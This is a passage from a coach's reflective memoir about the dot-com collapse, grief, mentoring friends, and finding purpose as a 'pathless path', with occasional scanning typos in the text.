young son of a young man to being a young man to being the\nyoung father of a boy, then a girl, and then another boy. Each of them,\nadults now in their own right; my oldest is the same age I was when I\nbecame a father and, soon after, said good-bye to Dad.\n\nReverie interrupted by questions. Step, step, crunch. Who am I\nbecoming? Step, step, crunch. What do I believe to be true about the world?\nStep, step, crunch. As I’m becoming an elder... Now what should I do with\nmy life now that I am becoming an elder? Crunch, cough, cough, sniffle,\nstep.\n\nSniffles, crunches, and questions were then followed by the words of the\npoet David Whyte:\n\nBy the lake in the wood,\nin the shadows,\n\nyou can\n\nwhisper that truth\nto the quiet reflection\nyou see in the water... .\n\nRemember,\nin this place\nno one can hear you\n\nand out of the silence\nyou can make a promise\nit will kill you to break.\n\n“That way,” the poet promises, “you’ll find what is real and what is not.”\n\nWhat’s real? What’s not? I’d walked Wonderland with my colleague\nAndrew just days before. It was on our third circumambulation of the lake\nwhen he finally asked the question he’d been carrying: What should I do\nwith my life? Earlier in the week, he’d stopped me at a coffee shop; mid-\norder, he turned to me: “Can we go for a walk sometime?” His eyes\nrevealed a terror; he expected me to scoff and reject him, to laugh in his\nface at the absurdity of his idea.\n\n“Of course,” I said, “I’d like that. How about Friday, at eleven, at\nWonderland?”\n\nCattails at the lake’s edge swayed. The frost glistened as the sun moved\ntoward the center of the sky. He turns to me, “I know this is absurd of me to\nask ... I mean, I’m a coach, too, and I’m supposed to be giving other\npeople advice . . . but, well...”\n\nThe pause hung. “What?” I asked. “Andrew, whatever story you’re\ntelling yourself is likely wrong. Whatever it is that’s stopping you from\nspeaking is old, tired, and worn out. Old programming designed to keep you\nsafe. I’m not judging you. I’m just a friend, going for a walk with you.”\n\nHe burst into tears: “I don’t know what to do with my life. I’m forty-four\nyears old and I have no idea if I’m doing the right thing.” The tears flowed\nand his body shook. I grabbed his hands and squared up opposite him.\n\n“Andrew, no one knows if they’re doing the right thing. No one.\nWhatever story you’ve been telling yourself about how you’ve failed,\nwhatever ‘should’ you’ve been carrying about having had it all figured out\nby now ... well, all that’s just bullshit, stories told to you by the ghosts in\nyour machine.”\n\nThrough blurry, teary eyes he looked from our clasped hands to my eyes,\nstill unsure if I was judging him. “But you’ve got it all together, you figured\nout how to make a living doing the thing you love.”\nI burst out laughing: “Oh, geez. Have I got you fooled!”\n\nWe started walking again. His questions became pragmatic and\nstructural. “Give me the steps, Jerry. How do I get customers? How do I\nconvince people to hire me? How do I build a business? How do I raise\nmoney? How do I hire people? How do I fire people?”\n\nAll genuine, important questions but, really, all a proxy for the deeper\nexistential questions: Am I doing it right? Is it supposed to feel this\nconfusing? Will I ever feel safe, warm, and happy? Where do I belong?\nWhat do I want from this life? Am I worth it? Have I earned my place on\nthe planet, in this life? And, of course, If my life isn’t unfolding as I\nexpected, then what am I doing?\n\n“T want to strip everything away,” he continued. “Anything that’s not me,\nto the bare essence of me, just so I can figure out what path I should take.” I\nknew that feeling.\n\nYears before, I had knelt before Pema Chédron, pleading for her to tell\nme the path, the way, the steps I should take, to take me out of the pain.\nThen she lovingly tapped my hand, telling me about the pathless path. It\nmakes sense now; then it left me bereft.\n\n“You seem to want to know that you’re making progress,” I offered.\n“That there’s a path and that you’re on it.” He nodded with relief.\n\n“Tt’s curious,” I continued. “We’re all so desperate to move up and to the\nright. We’re convinced that any motion that isn’t straight, direct, up and to\nthe right is somehow not part of the path.”\n\nWhat if being lost is part of the path? What if we are supposed to tack\nacross the surface of the lake, sailing into the wind instead of wishing it was\nonly at our backs? What if feeling lost, directionless, and uncertain of the\nprogress is an indicator of growth? What if it means you’re exactly where\nyou need to be, on the pathless path?\n\nOpening an e-mail recently, there it is again: the wish for direction, a\npath: “Dear Jerry,” the inquiry begins. “I am looking to define a meaningful\nnext chapter which meets my personal, professional, and practical goals.”\n\nAnd then, opening yet another note: “I’m not lost, but could sure do with\na point in the right direction (and a kick up the ass!).”\n\nWe all want it: movement that demonstrates that our experience is\nmeaningful; that it’s taking us someplace; a place where we are smarter,\nricher, healthier, less afraid, more secure. Up, up, and to the right.\nWe live in a world that says anything less is failure. Up and to the right,\nwe’re told, is where the happy people are. That’s where the people who\nnever fear, never fail, never struggle live.\n\nOur economy is driven by the sense that here—down and to the left—is\nawful and if we buy the right soap, drive the right car, build the right\ncompany, love the right way, we’ll be safe and loved and happy forever and\never. And ever.\n\nWe look to those who seem serene, content—the embodiment of up and\nto the right—and fail to see the struggles they have lived through. We\nproject onto them our wishes and expectations of reaching that point where\nall things are at peace and we never, ever have bodily odor. Everyone else’s\njourney is so much easier. Everyone else’s business is so much more\nsuccessful. And if only someone—you—would show me the steps on the\npath, give me a map, then I can get there, too.\n\nBut a map is a poor substitute for a life lived. The truest guide isn’t the\nmind of a guru but your broken, scared and scarred, lonely heart. I just wish\nbroken-open hearts weren’t so damned painful.\n\nThe irony, of course, is that up and to the right, as appealing as it is when\nwe’re down and to the left, is a place of separation. It’s a place where, were\nwe to achieve it at all, we’d find ourselves utterly alone.\n\nHandprints on the Canyon Wall\n\n“[T]Jucked up in clefts in the cliffs,” wrote the poet Gary Snyder in his poem\n“Anasazi.”\n\nAnasazi and their descendants, the Havasupai. I hear their names as I\nclose my eyes and dream of my days visiting the Grand Canyon.\n\nBy August 2001, everything was broken. One of the companies I’d\ninvested in, The Industry Standard magazine, had been an emblem of the\nseeming rise and rise of the “new economy.” Each weekly issue was fat\nwith ads. Then, suddenly, it all seemed to stop. With the collapse of the\nfinancial markets, venture capital stopped flowing to start-ups. With start-\nups failing like falling knives, ads dried up. Suddenly caught with too many\nexpenses, management struggled to find a way to right-size our way out of\nthe problem. Infighting, fear, clashes between the investors (myself\nincluded) kept us from funding the shortfall. Suddenly we were bankrupt. It\nwas big news, as most of the people who followed the venture-backed\ntechnology space also read The Industry Standard.\n\nIn August 2001, as the news broke, I was hiking down the Kaibab Trail\nfrom the North Rim of the Grand Canyon with a group that would spend the\nnext week rafting the Colorado, at the base of the canyon, in the belly of the\nEarth.\n\nThe first stirrings of the unease, discomfort, and pain that—months later\n—would leave me gasping for air, for life at Ground Zero, had begun just\nafter the market freefall in March 2001. Shortly after, Fred, my partner at\nFlatiron, and I had begun negotiating with our investors about altering or\neven shutting down the investment program we’d launched in 1996. I\nremember tearfully telling Fred that I wasn’t sure what was happening to\nme or what I wanted to do long term, but I knew I couldn’t commit to\nbuilding another investment fund.\n\nI didn’t know it, but I was dying inside.\n\nBack in the canyon, I began to both fall apart and sense that there was\nanother way. Three days into the rafting trip, all the stresses of life above\nthe rim had slipped away. I’d lie on my sleeping pad at night, relaxing my\ngaze to better glimpse shooting stars. I’d discovered that looking for the\nmovement was not the way to see them—an insight that I have come back\nto time and again in the years since.\n\nThe night before we were to visit Deer Creek Canyon—a sacred place\nwhere the Havasupai youth would test their adulthood by leaping across a\nchasm to leave a handprint on the other side—I felt the thinness of my own\nexistence. I realized, as poet David Whyte notes, “how easily the thread is\nbroken / between this world / and the next.”\n\nHandprints on the canyon wall, placed as those young warriors entered\nthe temple of their adult aloneness, testified that, regardless of the solitude,\nthey had been there.\n\nI lay in the dark as the dawn broke past the rim, weeping. “What are my\nhandprints?” I yelled at myself. “Some fucking investment? Is this how my\npassage through and existence in this life is gonna be remembered? Fuck!”\n\nI thought back to the time when, sheltered under the boardwalk at Coney\nIsland I declared: “This is not going to be my life!” I wasn’t meant to live\nhidden in the shadows of the boardwalk, weeping.\n\nSuddenly, amid the tears, I had a memory. I remembered walking out of a\nmovie theater with my big sister Mary. She’d taken the seven-year-old me\nto the Loew’s Kings Theatre on Flatbush Avenue, blocks from our home on\nEast 26th Street—between Clarendon Road and Avenue D—to see a Laurel\nand Hardy film festival. A weird kid, I loved Laurel and Hardy, and Mary\nloved me and so she wanted me to be happy and took me to see sixty-year-\nold films. For hours, we’d sat in the darkened Kings.\n\nAfterward, holding hands, swinging arms, we walked to the ice cream\nparlor; movies and ice cream and swinging arms: love, safety, and\nbelonging.\n\n“What do you want to be when you grow up, Jerry?” she asked. Looking\nback, I realize she was a kid herself, just in her twenties, and was already\nthe teacher she’d chosen as her profession.\n\n“T don’t know,” I answered shyly, unsure of what she was really asking\nme. Pausing before speaking more, I remembered the feeling I often had\nbefore falling asleep each night. As I lay in bed, a dark hole in my chest\nwould open up, a hollowness, a loneliness deeper than anything that\nstemmed merely from being alone.\n\nTo close the hole, I’d hug my Howdy Doody doll ever closer. It was a\ntoy; it was supposed to be played with in a particular way. A kid was\nsupposed to use it to put on puppet shows. But not me. I just hugged him,\nheld him, and used him as best as the seven-year-old me could to close that\ngaping wound, that crack in the bark of my tree.\n\nAfter becoming a father, I came to realize that not everyone felt that hole\nin the chest, not everyone saw the hole as evidence of brokenness and\nunlovability. Still hesitating, I turned to Mary, “I think . . . I think maybe I\ndon’t want to be forgotten.”\n\nWe stopped walking and she tured to see me more clearly, inviting me\nto say more, “Like, I don’t know . . . a hundred years from now, when\nsomeone is talking about Flatbush Avenue and the Kings and the people\nwho lived here, I want people to know I was here.”\n\nSeen but not seen. There but not there. The boy in the crack of the tree,\nwishing to leave handprints.\n\nDecades later, I stared at the handprints on the walls of the canyon, deep\nin the belly of the Grand Canyon. I had fallen apart, just as Pema, in a way,\npredicted when she had written her book. I looked for my own handprints,\nevidence that I had passed this way, that I mattered. Then, at the bottom of\nthe canyon, I found a new way to see.\nAt the end of the rafting trip, we were lifted from the bottom of the\ncanyon by helicopter. Two hours later, I sat at McCarran Airport, stunned by\nthe incessant ding, ding, ding of slot machines, cascading coins, and dreams\nof a better life. I'd left the canyon, but the canyon never left me.\n\nAfter Ground Zero\n\nOnce upon a time, there was a prince who stood not under a boardwalk in\nBrooklyn but within a castle in northern India, declaring, in his way, that\nthis was not to be his life. He left his father’s castle to find himself and\nended up under the bodhi tree. Having declared, “Fuck it,” he’d given up\ntrying to see the shooting stars and learned to relax his gaze.\n\nWe came out of the canyon and into September 11, 2001, and its\naftershocks. I had naively thought that market collapses, vanishing wealth,\nand failing, falling knives of start-up investments were bad. But I hadn’t\nconsidered the unrelenting terror emanating from Ground Zero. How could\nI have?\n\nThe springtime collapse of 2001, the late-August handprints on canyon\nwalls, the autumnal dying of the light and terrifying rupture of our\ncollective delusions of safety all led inexorably to my collapse. They all led,\ntoo, to my transformation and an acceptance of my purpose, my karma, and\nmy reason for being.\n\nIt was as if shooting stars, asteroids, and meteors had fallen from the sky,\nhitting me midway through the journey of my life, and knocking me not\nmerely onto a new trajectory but into the orbit I was born to traverse.\nLooking backward, I couldn’t draw a straight, up-and-to-the-right line\ndefining my path, no matter how hard I tried.\n\nUnderstanding that this is, in fact, the universal pathless path defies not\nonly the messages of our economy. It defies the daily and relentless\npropaganda of social media. My friends and family, especially those in their\ntwenties, confound themselves not only by holding themselves to some\nunrealistic standard of a non-messy, straightforward unfolding of their lives\nbut by comparing their internal mass of contradictions, confusion, and\nuncertainty with the happy lives they see posted on Instagram.\n\nI say this dramatically, trying to cut through the fog of useless and\nconstant comparison in which we inevitably come up short, less than, and\ntherefore broken and unworthy of love. Dear ones: Newsflash. Snapchat,\nInstagram, and Facebook lie.\n\nThe path to a purpose-grounded life is messy, muddy, rock-strewn, and\nslippery.\n\nI have a dear friend, a boot-camper, who knew all her life that she liked\ngirls more than she liked boys. But in the Christian household of her\nchildhood, her truest self was quashed because she was believed to be\npossessed.\n\nI have another dear friend, another boot-camper, who knew her whole life\nthat the gender assigned to her by the world was wrong. Misgendered. Not\nher. She was trapped in a jail made of the bars of others’ perceptions. All\nher life, she played along to ¢ry to belong, and, playing along, she felt she\nwas slowly dying inside. One night, under the stars of a clear Colorado\nnight, she heard stories of others whose truths were quashed, squashed, and\nsqueezed to fit into someone else’s preconception of what it meant to be a\nCEO, an entrepreneur, a good girl, a good boy, worthy of love, safety, and\nbelonging. She felt their tears. She leaped across the chasm, the false\nchasm, the one that tells us that the Other’s story is not our story and that\nour story is uniquely bad, or different—further evidence not of our adult\naloneness but of our childlike, fearful loneliness. The cause of the deep\nchasm in the middle of our chest.\n\nIn that leap, she touched the handprints of the others who'd leaped their\nown chasms, and in so doing, she was able to leave her own. Leaving, too,\nthe old identity, unlearning all that had confined her, all that restricted her,\nall that entrapped her.\n\nShe discovered who she is now, casting aside the need to know who she\nwill be later. She dared to leave new, truer handprints on the walls of the\nnewest canyon of her life.\n\nThe path requires standing still, radically inquiring within, learning to the\nbear the pain of uncertainty. Discovering your purpose, feeling your way\ninto that aliveness, requires clambering up rocky cliff faces, leaping\nchasms, tucking oneself deep into clefts and deeper and deeper into the\nEarth. It demands the willingness to step into the crack of the tree as well as\nthe bravery to step out of it. All this, and good-soled hiking boots.\nBut I Need a Plan!\n\nCrunch, crunch, step. My good-soled, low-cut hiking boots slipped and slid\nas Andrew and I made dora, rimming Wonderland.\n\n“But you’ve got it all together, you figured out how to make a living\ndoing the thing you love . . .” I chuckled quietly, knowing what was coming\nnext. “... [need a plan.”\n\n“Here’s your plan,” I said out loud, annoyingly, enigmatically, “stop\nlooking for shooting stars.”\n\nI told him about lying on banks of the Colorado River, learning to relax\nmy gaze. “What would it feel like to let go of the need to know?” I asked.\nHe paused and felt what it would feel like in his body, not in his mind, if he\nlet go of not only the need to progress but of the belief in progress.\n\n“What would it feel like, in that body of yours,” I continued, “if\nincremental progress that was directionally correct were enough? What\nwould it feel like to tack across the surface of that lake instead of heading\nout for the other side, fully intending to make it in the shortest time\npossible?”\n\nI could sense him turning inward and really considering the feeling.\nCrunch, crunch. We walked on in silence, and then he broke it: “Relaxed.”\n\nI smiled enigmatically and lovingly. “If you could give up the need for\nmeasurable progress, if you give up the pursuit of purpose and meaning,” I\ncontinued, adding, quietly to myself—‘“and the need to build an exhaustible\nsupply of lemon drops”—“and then focused on doing what is right and true\neach day, it feels to me that you’d live in congruency with your truest self,\nwhere the meaning of your life was a function of the meaning of each day.\nAnd each day, an expression of your life.”\n\nEarly in 2017, I dreamed I was back in Tibet, hiking in a valley outside\nthe city of Yushu. I’d first visited Yushu in September 2010, five months\nafter an earthquake had killed thousands of people and destroyed hundreds\nof buildings. We’d spent months raising money and we’d brought supplies\n—winter tents, thick blankets, water—to a community still struggling to\nrecover.\n\nIn the dream, I was wearing low-cut hiking boots, clambering among the\nrocky terrain of a valley, pockmarked with carved images of Tibetan\nBuddhist saints and the ubiquitous prayer in Tibetan script, Om Mani\nPadme Hum.\nIn the dream, I sat down to take a drink when a hole opened in the ground\nbetween my bent knees. Peering into the hole, I realized that it was a mine\nshaft and that it was endlessly deep. Lungta—tiny Tibetan “wind horse”\nprayer flags, normally tossed at high mountain passes so that the winds can\ncarry the prayers printed on them to the Buddhas of the past, present, and\nfuture—fluttered in the shaft.\n\nPeering deep, I saw the Lungta turn into pages of the book of my life.\n\nScared little boy. Struggling adolescent lost, questioning whether to go to\nschool or even to live. English major, studying poetry with and star-struck\nby Marie Ponsot. Scholarship winner and, suddenly, struck by a shooting\nstar and set on a new course, a reporter at a technology magazine. Finding\nmyself as my life unfolded, yet still haunted by the sense of being lost.\n\nMy twenties became my thirties. My thirties seemed successful: I began\ncollecting lemon drops. Then suddenly struck by another shooting star,\nweeping in the canyon, falling to my knees at Ground Zero, discovering\ncompassion and the nature of reality through Pema Chédroén’s eyes;\ndiscovering courage through Parker Palmer’s writing; and discovering faith\nand lovingkindness through the words of Sharon Salzberg.\n\nStill lost, still searching, still struggling to let go of the need for progress\nthat was more than directionally correct, looking for the up-and-to-the-right\npath, I left my career. Looking for the well-worn, easy-to-travel path, the\none where your shoes didn’t need to be especially grippy, I crossed the\npolar ice cap in Greenland, rafted the Futaleuft River in Chile, and, most\nimportant, learned to meditate, to stand still even in empty time.\n\nI told Andrew, “My path was anything but straight.”\n\n“What if we lived our lives forgetting the destination we’re aiming for,” I\nasked. “What if we woke each day and just wondered what will happen\ntoday?”\n\nAs we continued walking, I was reminded of Joseph Campbell’s thought\nthat the pursuit of purpose and meaning is really a pursuit of aliveness, of\nrapture. Andrew leaned in, his eyes flashed.\n\n“And aliveness, well, I don’t know how we are fully alive when we\nspend all this energy damping down and rejecting the various parts of\nourselves.”\n\nDear Professor Campbell, yes, indeed, the pursuit of purpose is really a\ncover for the pursuit of a feeling, aliveness. But aliveness can come about\nonly after integrating even the most shameful parts of ourselves—even the\nstories of our misdeeds, mistakes, and missteps. Integrating those and\nlearning to forgive oneself.\n\n“There’s something you need to know about me,” I told him, “I’m a\nsucker for Oreos.”\n\nIn the years before, during, and immediately after my Ground Zero days,\nI was seventy-five pounds heavier than I am today. Frustrated, angry,\ndisgusted with myself, I hauled my (fat) ass into a nutritionist’s office.\n“Erica gave me a lot of tools,” I continued, “including a whole new\napproach to food.” But the most important gift she gave me was the power\nof “do-overs.” I explained that one day I had come to see her, dejected and\nready to give up. I whined: ‘I ate a fucking dozen Oreos last night, Erica. . .\na fucking dozen.’”\n\n“Well, the combination of sugar and salt is deadly for you. Some folks\nlike sweets. Some like salts. You’re one of the lucky few,” she said with\nsweet sarcasm, “who craves both. An Oreo is the perfect drug for you.” And\nthen she gave me the gift: “Tonight, it’s a do-over. Start again.”\n\nAnd suddenly I was twelve and back in Brooklyn, this time on West\n7th Street and Avenue T, playing stickball with Paulie, Ugo, and Pino. And\nwe were arguing about whether Paulie’s shot was a hit or a foul, and to stop\nthe fighting, Ugo yells “Do-over!” and just like that, all is forgiven, all is\nforgotten. It’s not an out. It’s not a foul. It’s not a hit. Do-over.\n\nLater—much later—I read Shunryt Suzuki’s Zen Mind, Beginner's\nMind and realized that coming back to the beginner’s mind is a do-over. “If\nI allow myself,” I tell Andrew, “then I can have an infinite number of do-\novers.” I explained that we can always return to what is, what is really\nhappening, what is truly present. Even more powerfully, if we do that, then\nwe can let go of the e-mail, let go of the missed quarter, let go of the shame\nof having eaten all those Oreos.\n\nEndless Do-overs\n\n“If you allow it, each footstep can be a do-over.” I was speaking by satellite\nphone with my client and friend, the polar explorer Ben Saunders, as he was\ntrying to retrace his friend Henry Worsley’s path across Antarctica. The\nsastrugi—the parallel wavelike ridges carved by the polar winds into the\nsurface of icy snow—were tougher than he’d imagined, and he was close to\ngiving up.\n\nThe possibility of giving up wears on him. In 2016, his friend, his\nmentor, Henry, stopped one hundred and twenty-six miles short of his goal\nof being the first person to cross the Antarctic peninsula unaided and\nunassisted. Overcome by exhaustion and airlifted out, Henry died in Chile.\nBen’s trying to complete the journey, to finish his friend’s quest. He’s been\ncursing each ridge, he told me; each ridge means he can’t really ski but\nmust painfully step up and over.\n\n“Soften your gaze,” I told him. Each morning, each step, is a chance for\nbeginner’s mind, I continued. I’d recommended Shunryt Suzuki as a\ncompanion on this trip, so he understood the reference. “Perhaps you can\nhold off deciding to continue or not until you make it to the Pole.” When\nthe big goal feels too large, take only small steps.\n\nI thought of my advice to Ben as I listened to Hollis, my editor. Midway\nthrough the journey of this book, every page, every word felt like a sastruga\nridge, with fifty-below headwinds pushing me back. “Just write essays,” she\ncounseled. The next week, I reread Anne Lamott’s Bird by Bird. She tells\nthe story of her father helping her brother write a school essay on birds:\n“Bird by bird, buddy. Just take it bird by bird.”\n\n“Do you remember those old manuals IBM used to put out with their\nsoftware?” I’m sitting by a fire at a retreat center with my longtime friend,\nthe wonderful author Seth Godin, and he’s giving me advice on how to keep\ngoing when you want to give up. “When you’re stuck, you should just do\nwhat they 010. . . stick a blank page in the stuck point and type: ‘This Page\nLeft Intentionally Blank.’”\n\nBird by bird. Blank page by blank page. Ridge by ridge. Step by step.\nAnd, if need be, do-over after do-over after do-over—tacking across the\nsurface of the lake, of your life, of the book you’ve promised to write, the\nfriend’s journey you’ve promised to complete, making incremental progress\nthat’s directionally correct.\n\nAsteroid Strikes and Strategic Retreats\n\nSo, we move across the lake, this way and that. We launch a business and\nwe think, Ah, I’m in the search business, and suddenly some tool we created\nto make our business run more smoothly is seen by a customer who says,\n“Wait, I don’t want your product, I want that.” And you shift, your business\nis different.\n\nOr sometimes, in moving across the lake, you major in English in college\nand, finally, you’ve got an answer to the question your sister asked you on\nFlatbush Avenue all those years later: I’m going to be a teacher, like you.\n\nBut then, suddenly, you’re in your adviser’s office, crying about the fact\nthat you don’t have the money for tuition and that you must drop out, and\nProfessor Robert Greenberg says, Well, that’s not going to happen. You’re\nnot dropping out. I’m the judge of a scholarship contest and I’m going to\ngive you the scholarship. 1011 pay your tuition until you finish up.\n\nAn asteroid strike—you can stay in school and then you tack in a\ncompletely different direction because the scholarship comes with a\nsummer internship.\n\nA few months later you’re spending your summer proofreading copy at a\nweekly technology magazine and unbeknownst to you, you’ve stumbled\ninto a career that will eventually lead to a position as an investor in\ntechnology companies and, still later, as a coach, talking with folks about\ntheir own twisty, topsy-turvy lives.\n\nLike the award-winning filmmaker and entrepreneur Jeff Orlowski. You\nleave high school thinking you’re going to be a professional photographer, a\nprofessional cyclist, or a professional pianist—certainly not an engineer, as\nyour mother wanted. So, yes, you agree to go to Stanford, and then one day\nyou see a notice that a climate scientist needs an assistant to help take\npictures, and as a web-savvy teenager you’re using your skills to launch a\nbusiness that builds websites for photographers like your father. And\nthrough that connection you find out that a climate scientist needs a website\nbuilt, and, hey, you know how to do that, so you offer to do some free work,\nand months later, you’re in Greenland, setting up cameras to photograph.\nAnd years later, your new friends have made a film that picks up awards at\nfestivals around the world and you find yourself onstage with close friends\naccepting an Emmy.\n\nAnd suddenly you’re a filmmaker. What’s more, you’re an entrepreneur,\nraising money, making product-art to change the world.\n\n“Um, so I went to a camp,” Jeff told me. “I went to a camp when I was in\nhigh school called Camp Rising Sun. It’s this youth leadership program in\nupstate New York. It had a profound impact on me for . . . for countless\nreasons.” And he tells me a story about the campfires held every Saturday\nnight.\n\nTeenagers, youth leaders all, sitting around the fire, thinking, “What shall\nI do with my life?” Some think, “Professional cyclist, photographer, or\npianist.” Others are even less sure.\n\n“The elders in the community would share some insights, some wisdom,”\nhe continued. “There was one that a friend of mine, a mentor, gave that has\nstuck with me for a really, really long time.” The mentor, Chris, was a\nskilled chess player and he’d drawn some analogies between chess and life.\n“He shared this concept of a strategic retreat.” There are times both in chess\nand in life, when you’re going down a certain path, and you hit a roadblock.\nAnd then you realize that the moves you’re trying to make aren’t working\nout. “At those times, I have to abandon that game plan and re-strategize,\nand make a strategic retreat and take a different plan of attack.”\n\nI pointed out that the retreat is strategic because it’s smart, it keeps you\nsafe, and it comes from a place of being brave enough to admit that you\nneed to choose differently. That the path isn’t straight and up and to the\nright.\n\nWe can’t plan for an asteroid strike. As I learned lying on the banks of the\nColorado, at the bottom of the canyon, the best we can do is relax our gaze\nand let the shooting stars streak across our life.\n\nWhat Stops You from Having the Life You\nDeserve?\n\nI’m racing to make a flight when my cell phone vibrates. Fuck. Who’s\ncalling now? I look down at the LCD, pre-smartphone screen—this is 1996\n—it’s Mark Pincus.\n\nFuck. Mark is calling me again. Months before, I’d met Mark and his\npartner, Sunil Paul, when they were raising money for their first start-up,\nFreeloader. Sunil and I had known each other from my days at CMP and we\ncontinued to stay in touch after I left CMP and helped start\nCMG@Ventures, a tiny-venture fund that was part of a public company\ncalled CMG Inc. (CMGI).\nMark knew an investor, Fred Wilson, then with a venture firm called\nEuclid Partners. Fred invested in Freeloader. I couldn’t get the deal past my\npartners. Even though I was not an investor, I continued to respond to\nMark’s requests for help.\n\n“Jerry,” he’d e-mail, “what do you think of this revenue model?” I\ndelighted in Mark despite his relentlessness.\n\nRacing to board my flight, I choose to answer my phone. Bam, another\nasteroid strikes. My path suddenly altered, and here is a new, unexpected\nway forward.\n\n“Fred’s raising a new fund,” Mark blurts out, “and you should be his\npartner.”\n\nSix months or so later, we’d launched Flatiron Partners.\n\nWhat if I hadn’t taken his call? What if I had simply followed my initial,\nselfish impulses and ignored Mark’s insistent, incessant, requests for help\n—“Dammit, I’m not even an investor. I have nothing to gain from helping\nyou.”\n\nWhat if I hadn’t walked into Professor Greenberg’s office and admitted\nthat I’d been ignoring the letters from the bursar’s office?\n\nSince then, I’ve passed through the Flatiron days, I’ve floated down the\nColorado River, lived through the crazy-making experiences of sudden-\nwealth syndrome and shame-producing consequences of businesses I’ve\ninvested in failing, and years later, I’ve emerged, scarred but steady. Alive\nand thriving.\n\nI’m on my own, working as a coach. Fred’s still a close friend as is Brad\nFeld, another loving asteroid in my life whom I first met in the early days of\nmy career, back when we all had thick black hair and laughing enthusiasm\nfor the sheer fun of building a new world out of this thing called the\nInternet.\n\nBoth Fred and Brad love me and are generous and kind in singing my\npraises. I can take in some of their love and yet I know, too, that it’s coming\nthrough the filter of decades of friendship.\n\nOne day, an e-mail arrives. “I was reading a blog post by Fred Wilson,”\nwrote Khalid Halim. In the post, he’d written that I was the best CEO coach\nhe knew. Khalid explained that he wanted to be a coach and wondered if I\nwould be willing to help him.\n\nAt that point, I was overwhelmed. “I don’t have time for another client,”\nI said to myself petulantly. My old, old, old sense of too many people\nwanting too much from me rises. Yet the sincerity of his wish stops me, and\nI read his note again and again. He wants to help others, I see. I think I see\nhis heart. I say yes to an early-Saturday-morning call, every few weeks.\n\nAnd yet today, he’s one of my partners in this heart-filled enterprise\nwhere we take closed, scared, and scarred leaders and help their hearts\nbreak open and for warriors to emerge.\n\nThere’s Khalid, with whom I partnered to form Reboot. There’s Dan Putt,\nanother former client turned partner and co-founder whose strength and\ngentleness were clear to me even as they were shielded from him, shielded\nby the confusion of his self-doubt and his rigidly held belief that there was a\npath to entrepreneurial freedom, nirvana, and life everlasting. His own\ncapacity was blocked by the firmly held belief that the reason he couldn’t\nsee the path clearly was that he was broken. Not that the path is pathless but\nthat he wasn’t worthy to trod it.\n\nAnd Ali Schultz, our fourth co-founder, herself an asteroid with a sparkly\nsmile and fierce heart who challenged me to step into my own capacity with\nher own simple question on a walk in the hills surrounding Boulder: “What\nstops you from building the life you really deserve?”\n\nWhat if I hadn’t answered that e-mail from Khalid? The request for\ncoaching from Dan? Or the invitation from Ali to hike ? What if I hadn’t\nput Dan together with Khalid together with Ali and all three challenged the\nfour of us to take the next step and build a company out of the singular lives\nwe’d crafted for ourselves?\n\nOne day, long after having given up his dream of being a writer—the\nunspoken, unacknowledged answer to his sister Mary’s question of what\nhe’d like to be when he grew up, the unvoiced plan behind his wish to be\nremembered—the English major turned tech reporter turned venture\ncapitalist turned brokenhearted coach, got an e-mail from a prestigious\neditor from a prestigious publisher: Have you ever considered writing a\nbook? One day, I had the courage to answer an e-mail that would have me\nwriting a chapter on the life transformations of asteroid strikes and how\npurpose is lived into and not merely found.\n\nSometimes the paralysis of choice stems not from the path being\nwinding, unpredictable, and uncertain but from the forks in the road.\nImplicit in the belief that the path is not, in fact, pathless is the belief that\nthere’s a wrong fork and, worse, we may choose unwisely, only to regret\nour lives.\nIt’s hard enough to fend off the fear of choosing unwisely. It’s hard\nenough to try to relax your gaze enough to know that life will unfold\nhowever it will unfold and somehow just be okay with that. Harder still is\nthe burden of disappointing those who wish us to step off onto one fork or\nthe other.\n\nSage Joseph Campbell, with love and joy, suggested we follow our bliss.\nBut when facing that fork in the road, when at the crossroad, choosing to\ntack left or right, we want so much to know which path will lead to bliss.\n\nIf we knew which path the right path was, crossroads wouldn’t be as\nmystical or magical as they are.\n\n“Look for the turtles,” I said one day to then-client Dan Putt while he sat\non my couch, wondering which fork to take. “Look for the turtles,” I said,\nthinking it made me sound like a wise old soul. “Look for the turtles,” I\nsaid, recalling the joy-filled instructions his late mother would share with\nhim as they would wander for a walk at a nearby pond during the latter\nstages of her battle with breast cancer.\n\nHow do you look for the turtles when you’re unsure which path the\nturtles are taking? How do you even know where to look for the turtles?\n\nThat is this life’s work because that is the work of our lives. Like Dan\nand so many others like me, sitting on the couch listening to Ani Pema\nspeak of the pathless path, we often suffer because we are convinced that\nthe path to fulfillment and a life of purpose is out there to be discovered,\nfound. Once found (or pointed to by some wise sage), our task—we believe\n—is to head out, unflinchingly, striding with clear-eyed resolve.\n\nWe come of age asking ourselves, “Who am I to be?” Later, as we live\nour way into being who we are, we come to questions, “What am I to do?”\nand “What is my purpose?” Later still, as our elder-wisdom seeps into our\nbones, we might replace that question with the simple “Have I been kind?”\n\nAm I the adult I was supposed to be when, under the boardwalk, I shook\nmy fist at the sky and declared that this was not to be my life? Is this the life\nof meaning that is my birthright?\n\nThere’s a devilish trap, though, in that question. A trap exacerbated by the\nadmonitions and advice of writers, ascetics, sages, and charlatans who\novertly or covertly offer steps on the path. The trap is implicit in the\nquestion: Purpose is not something external to us. It’s not a place to get to.\nThe admonitions, instructions, and advice of others will, at best, fall short\nand, at worst, make one feel nothing but harshly self-critical for even\nholding the question in the first place.\n\nThe wise teacher Joseph Campbell wrote that people conflate the pursuit\nof purpose with a pursuit of aliveness. 111] go further, though; aliveness\ncomes not from having magically discovered purpose, meaning, nirvana,\nand a never-ending supply of lemon drops.\n\nAliveness comes from living a life of personal integrity in which our\nouter actions match our inner values, beliefs, wishes, and dreams. I am\nliving my purpose, living with aliveness, when I write, regardless of\nwhether my words are published. This then defines our life’s work not as a\npath to be discovered (and certainly not by following someone else’s map)\nbut as a way of being, where each day is a chance to live into the command\nto live with the inner and outer in alignment. Acknowledging the days,\nweeks, months, and years when we have not lived that way, giving\nourselves the do-over, the freshness of beginner’s mind, to rise again and\ntry again.\n\nWork—our careers, our professions, our jobs—is neither the blissful\nexpression of deep purpose nor the dreadful obligation that stands in the\nway of being ourselves. Work is an opportunity for a daily realignment of\nthe inner and outer, a daily do-over of life expressed with integrity.\n\nTransformation is not how we discover the path up and to the right. No\nmatter how many trips around Wonderland Lake we take, we are still bound\nto the truest task: live into congruency, tacking across the lake where the\nwinds powering us are the answers to the questions. Who are we? What do\nwe believe to be true, today? What is the world we wish to create every day\nwith our actions and our hearts?\n\nThis calling to a deep, radical inquiry into self is not only the path of\ntransformation, the path to purpose but, in the end, how we grow strong,\nresilient, and capable of meeting the world like the openhearted warriors we\nwere born to be. By this process of withstanding the asteroid 